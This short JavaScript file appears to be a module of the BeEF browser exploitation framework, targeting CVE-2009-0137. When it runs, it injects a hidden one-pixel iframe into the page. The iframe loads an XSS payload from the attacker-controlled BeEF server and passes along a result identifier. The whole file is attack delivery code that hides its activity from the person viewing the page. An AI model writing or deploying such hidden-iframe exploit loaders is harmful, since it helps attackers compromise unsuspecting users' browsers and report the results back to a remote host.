function do_main(){	
	var iframe = document.createElement('iframe');
	// pass result_id in the url
	iframe.src = beef_url + 'modules/symmetric/xplt_cve_2009_0137/xss-max.xml' + '#' + result_id;
	iframe.setAttribute("width", "1");
	iframe.setAttribute("height", "1");
	iframe.setAttribute("style", "visibility:hidden;");
	document.body.appendChild(iframe);
}

do_main();